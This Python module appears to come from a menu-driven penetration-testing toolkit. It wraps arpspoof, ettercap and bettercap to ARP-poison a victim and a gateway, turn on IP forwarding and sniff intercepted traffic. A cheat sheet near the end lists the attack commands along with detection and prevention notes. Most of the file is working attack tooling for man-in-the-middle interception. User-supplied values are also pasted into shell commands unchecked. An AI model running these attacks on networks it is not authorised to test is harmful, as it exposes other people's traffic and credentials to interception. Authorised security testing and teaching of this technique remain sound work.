"""ARP Spoofing & MITM Attack Module - ARP poisoning, sniffing, and man-in-the-middle attacks."""

import sys
import os
import platform

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "arp_spoof"


def _get_interface():
    """Ask user for network interface."""
    info("Detecting network interfaces...")
    run_command("ip link show 2>/dev/null || ifconfig -l 2>/dev/null || ipconfig 2>/dev/null", capture=True)
    return ask("Enter network interface (e.g., eth0, en0, wlan0)")


def _arp_scan(session):
    """Scan local subnet for hosts via ARP."""
    iface = _get_interface()
    subnet = ask("Enter subnet (e.g., 192.168.1.0/24)")
    if not subnet:
        error("Subnet required.")
        return
    cmd = f"arp-scan -I {iface} {subnet}" if iface else f"arp-scan {subnet}"
    run_with_preview(cmd, session, STAGE)


def _arpspoof_attack(session):
    """ARP spoof using arpspoof (dsniff package)."""
    iface = _get_interface()
    target = ask("Enter target IP")
    gateway = ask("Enter gateway IP")
    if not target or not gateway:
        error("Target and gateway required.")
        return

    warning("[!] This will intercept traffic between target and gateway.")
    if not confirm("Enable IP forwarding and start ARP spoof?"):
        return

    # Enable IP forwarding
    if platform.system() == "Linux":
        run_with_preview("echo 1 > /proc/sys/net/ipv4/ip_forward", session, STAGE)
    elif platform.system() == "Darwin":
        run_with_preview("sysctl -w net.inet.ip.forwarding=1", session, STAGE)

    info("Starting ARP spoof (Ctrl+C to stop)...")
    info(f"Spoofing {target} ← YOU → {gateway}")
    cmd = f"arpspoof -i {iface} -t {target} {gateway}"
    run_with_preview(cmd, session, STAGE)


def _ettercap_arp(session):
    """ARP MITM via ettercap."""
    iface = _get_interface()
    target1 = ask("Enter target 1 IP (victim)")
    target2 = ask("Enter target 2 IP (gateway)")
    if not target1 or not target2:
        error("Both targets required.")
        return

    options = [
        ("1", "[bold]Text mode[/bold]       - Terminal output only"),
        ("2", "[bold]GUI mode[/bold]        - Graphical ettercap"),
        ("3", "[bold]Capture only[/bold]    - Write to PCAP"),
    ]
    mode = show_menu(options)

    if mode == "1":
        cmd = f"ettercap -T -M arp:remote /{target1}// /{target2}// -i {iface}"
    elif mode == "2":
        cmd = f"ettercap -G -M arp:remote /{target1}// /{target2}// -i {iface}"
    elif mode == "3":
        outfile = ask("Output PCAP file", default="capture.pcap")
        cmd = f"ettercap -T -M arp:remote /{target1}// /{target2}// -i {iface} -w {outfile}"
    else:
        return

    run_with_preview(cmd, session, STAGE)


def _bettercap_arp(session):
    """ARP spoof via bettercap."""
    iface = _get_interface()
    target = ask("Enter target IP (or leave blank for full subnet)")

    if target:
        cmd = f'bettercap -iface {iface} -eval "set arp.spoof.targets {target}; set arp.spoof.fullduplex true; arp.spoof on; net.sniff on"'
    else:
        cmd = f'bettercap -iface {iface} -eval "set arp.spoof.fullduplex true; arp.spoof on; net.sniff on"'

    run_with_preview(cmd, session, STAGE)


def _enable_forwarding(session):
    """Enable/disable IP forwarding."""
    options = [
        ("1", "[bold]Enable[/bold]  - Turn on IP forwarding"),
        ("2", "[bold]Disable[/bold] - Turn off IP forwarding"),
        ("3", "[bold]Check[/bold]   - Show current status"),
    ]
    choice = show_menu(options)

    if platform.system() == "Linux":
        if choice == "1":
            run_with_preview("echo 1 > /proc/sys/net/ipv4/ip_forward", session, STAGE)
        elif choice == "2":
            run_with_preview("echo 0 > /proc/sys/net/ipv4/ip_forward", session, STAGE)
        elif choice == "3":
            run_with_preview("cat /proc/sys/net/ipv4/ip_forward", session, STAGE)
    elif platform.system() == "Darwin":
        if choice == "1":
            run_with_preview("sysctl -w net.inet.ip.forwarding=1", session, STAGE)
        elif choice == "2":
            run_with_preview("sysctl -w net.inet.ip.forwarding=0", session, STAGE)
        elif choice == "3":
            run_with_preview("sysctl net.inet.ip.forwarding", session, STAGE)


def _restore_arp(session):
    """Restore ARP tables to normal."""
    iface = _get_interface()
    target = ask("Enter target IP")
    gateway = ask("Enter gateway IP")
    if not target or not gateway:
        error("Target and gateway required.")
        return

    info("Sending corrective ARP packets...")
    # Disable forwarding
    if platform.system() == "Linux":
        run_command("echo 0 > /proc/sys/net/ipv4/ip_forward")
    elif platform.system() == "Darwin":
        run_command("sysctl -w net.inet.ip.forwarding=0")

    # Send gratuitous ARPs to restore
    cmd = f"arping -c 5 -I {iface} {gateway}"
    run_with_preview(cmd, session, STAGE)
    success("ARP tables should be restored.")


def _cheat_sheet():
    """Display ARP spoofing cheat sheet."""
    content = """# ARP Spoofing Cheat Sheet

## How ARP Spoofing Works
- Attacker sends fake ARP replies to victim and gateway
- Victim thinks attacker's MAC is the gateway
- Gateway thinks attacker's MAC is the victim
- All traffic flows through attacker (Man-in-the-Middle)

## Quick Commands
```
# Scan for hosts
arp-scan -l

# Enable IP forwarding (Linux)
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof (dsniff)
arpspoof -i eth0 -t <target> <gateway>

# Ettercap MITM
ettercap -T -M arp:remote /<target>// /<gateway>//

# Bettercap
bettercap -iface eth0
> set arp.spoof.targets <target>
> arp.spoof on
> net.sniff on
```

## Detection & Prevention
- Static ARP entries: `arp -s <ip> <mac>`
- ARP inspection (DHCP snooping)
- Use encrypted protocols (HTTPS, SSH)
- Tools: arpwatch, XArp, ArpON

## Tools Required
- arpspoof (dsniff package)
- ettercap
- bettercap
- arp-scan
"""
    show_knowledge(content)


def run(session):
    """ARP Spoofing & MITM module entry point."""
    show_stage_header("ARP Spoofer", "ARP poisoning, MITM attacks, and traffic interception")

    while True:
        options = [
            ("1", "[bold]ARP Scan[/bold]         - Discover hosts on local subnet"),
            ("2", "[bold]ARP Spoof[/bold]        - arpspoof MITM attack"),
            ("3", "[bold]Ettercap MITM[/bold]    - ARP MITM via ettercap"),
            ("4", "[bold]Bettercap MITM[/bold]   - ARP spoof via bettercap"),
            ("5", "[bold]IP Forwarding[/bold]    - Enable/disable/check"),
            ("6", "[bold]Restore ARP[/bold]      - Fix ARP tables after attack"),
            ("7", "[bold]Cheat Sheet[/bold]      - ARP spoofing reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _arp_scan(session)
        elif choice == "2":
            _arpspoof_attack(session)
        elif choice == "3":
            _ettercap_arp(session)
        elif choice == "4":
            _bettercap_arp(session)
        elif choice == "5":
            _enable_forwarding(session)
        elif choice == "6":
            _restore_arp(session)
        elif choice == "7":
            _cheat_sheet()
